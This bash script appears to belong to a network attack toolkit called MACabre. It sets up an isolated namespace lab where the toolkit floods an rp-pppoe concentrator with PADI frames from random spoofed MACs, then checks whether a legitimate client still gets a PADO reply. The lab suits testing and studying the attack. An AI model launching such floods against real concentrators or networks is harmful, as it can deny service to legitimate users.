#!/usr/bin/env bash
# Isolated PPPoE discovery flooding lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   pppoe-server (rp-pppoe), the access concentrator (10.10.0.1).
#   attacker: MACabre's PADI flood, from random client MACs, with no PADR.
#   client:   a probe client that sends one PADI and counts the PADO replies to its MAC.
#
#   Phase 1 (baseline): one probe. The concentrator should answer with a PADO.
#   Phase 2 (flood): the attacker sends FRAMES PADI frames from random MACs. Its interface
#            is promiscuous and counts the PADO replies the concentrator sends back. Each
#            reply is unicast to a random MAC, which the bridge learned on the attacker's port.
#   Phase 3 (after): one probe from the client, to see whether it still gets a PADO.
#
# What the lab shows: whether the concentrator answers every PADI in the flood, and whether
# a legitimate client still gets a PADO afterwards. It does not reproduce the session pool
# being used up: that needs PPP sessions that stay open, which this lab does not run
# (no /dev/ppp and no pppd). Vendor concentrators and their session limits are not tested.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/pppoe_discovery_flooding_lab.sh
#   sudo FRAMES=500 scripts/lab/pppoe_discovery_flooding_lab.sh
#
# Requirements: iproute2, rp-pppoe (pppoe-server), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip pppoe-server; do
    if ! command -v "$tool" >/dev/null 2>&1 && [[ ! -x "/usr/sbin/$tool" ]]; then
        echo "Missing required tool: $tool (install the rp-pppoe package)" >&2
        exit 1
    fi
done
PPPOE_SERVER="$(command -v pppoe-server 2>/dev/null || echo /usr/sbin/pppoe-server)"

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
FRAMES="${FRAMES:-200}"
PROBE_MAC="02:00:00:00:00:31"
WORK="$(mktemp -d)"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in client attacker server lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add attacker
ip netns add client

for pair in "srv:server" "att:attacker" "cli:client"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv att cli; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set lo up
ip netns exec server ip link set h-srv up
ip netns exec attacker ip link set lo up
ip netns exec attacker ip link set h-att up
ip netns exec client ip link set lo up
ip netns exec client ip link set h-cli up

ip netns exec server "$PPPOE_SERVER" \
    -I h-srv -L 10.10.0.1 -R 10.10.0.100 -N 3 -F >"$WORK/server.log" 2>&1 &
sleep 3

PROBE_CODE='
import os, time
from scapy.all import AsyncSniffer, Ether, sendp
from scapy.layers.ppp import PPPoED
mac = os.environ["PROBE_MAC"]
found = []
sniffer = AsyncSniffer(
    iface="h-cli", promisc=True,
    lfilter=lambda p: p.haslayer(PPPoED) and p[PPPoED].code == 0x07 and p[Ether].dst == mac,
    store=True,
)
sniffer.start()
time.sleep(0.3)
sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff", type=0x8863) / PPPoED(code=0x09, sessionid=0),
      iface="h-cli", verbose=False)
time.sleep(2)
sniffer.stop()
print(len(sniffer.results))
'

FLOOD_CODE='
import os, time, threading
from scapy.all import AsyncSniffer, Ether
from scapy.layers.ppp import PPPoED
from macabre.attacks.pppoe_discovery_flooding import PppoeDiscoveryFloodingConfig, run_pppoe_discovery_flooding
frames = int(os.environ["FRAMES"])
replies = AsyncSniffer(
    iface="h-att", promisc=True,
    lfilter=lambda p: p.haslayer(PPPoED) and p[PPPoED].code == 0x07,
    store=True,
)
replies.start()
time.sleep(0.3)
stats = run_pppoe_discovery_flooding(
    PppoeDiscoveryFloodingConfig(iface="h-att", frames=frames),
    threading.Event(),
    lambda _: None,
)
time.sleep(2)
replies.stop()
print(f"{stats.frames} {len(replies.results)}")
'

probe() {
    ip netns exec client env PYTHONPATH="$ROOT/src" PROBE_MAC="$PROBE_MAC" "$PY" -c "$PROBE_CODE" 2>/dev/null || echo 0
}

echo "Phase 1: baseline probe"
BASE_PADO="$(probe)"
echo "  PADO replies to the probe: $BASE_PADO"
echo

echo "Phase 2: flood $FRAMES PADI frames from random client MACs"
read -r SENT REPLIES < <(ip netns exec attacker env PYTHONPATH="$ROOT/src" FRAMES="$FRAMES" \
    "$PY" -c "$FLOOD_CODE" 2>/dev/null || echo "0 0")
echo "  PADI frames sent by MACabre: $SENT"
echo "  PADO replies seen on the attacker's port: $REPLIES"
echo

echo "Phase 3: probe after the flood"
AFTER_PADO="$(probe)"
echo "  PADO replies to the probe: $AFTER_PADO"
echo

if (( BASE_PADO > 0 )); then
    echo "Baseline: the concentrator answered the probe with a PADO. OK"
else
    echo "Baseline: no PADO before the flood. Result unreliable."
    exit 2
fi

EXPECTED="$SENT"
if (( SENT > 0 && REPLIES * 100 >= EXPECTED * 90 )); then
    echo "Delivery: the concentrator answered $REPLIES of $SENT PADI frames (at least 90%)."
    DELIVERED=1
else
    echo "Delivery: the concentrator answered only $REPLIES of $SENT PADI frames."
    DELIVERED=0
fi

if (( AFTER_PADO > 0 )); then
    echo "After the flood: the probe still got a PADO. The flood did not stop the concentrator from answering."
else
    echo "After the flood: the probe got no PADO."
fi

echo
echo "Result: the flood made the concentrator answer $REPLIES PADI frames. Session pool use is not measured here: it needs PPP sessions that stay open, which this lab does not run."
if (( DELIVERED == 1 )); then
    exit 0
fi
exit 1
